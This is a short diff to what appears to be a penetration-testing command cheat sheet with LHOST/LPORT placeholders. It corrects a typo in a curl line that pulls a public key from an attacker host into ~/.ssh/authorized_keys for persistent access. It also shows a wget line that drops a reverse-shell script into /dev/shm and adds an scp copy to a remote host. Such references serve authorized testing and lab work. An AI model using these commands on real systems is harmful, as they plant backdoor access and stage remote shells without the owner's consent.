@@ -1,6 +1,6 @@
 # Add public key to authorized keys
 # desc: Add SSH
-curl https://#{LHOST}:#{LPORT}/.ssh/id_rsa.pub >> ~/.ssh/authotized_keys
+curl https://#{LHOST}:#{LPORT}/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
 
 # desc: Download in RAM
 wget #{LHOST}:#{LPORT}/#{file} -O /dev/shm/.rev.py
@@ -35,3 +35,7 @@ sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.
 
 # ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
 ssh-keyscan 10.10.10.101
+
+# desc: Secure Copy to Remote
+# refer: https://wangdoc.com/ssh/scp.html
+scp #{source_file} #{user}@#{RHOST}:#{remote_path}
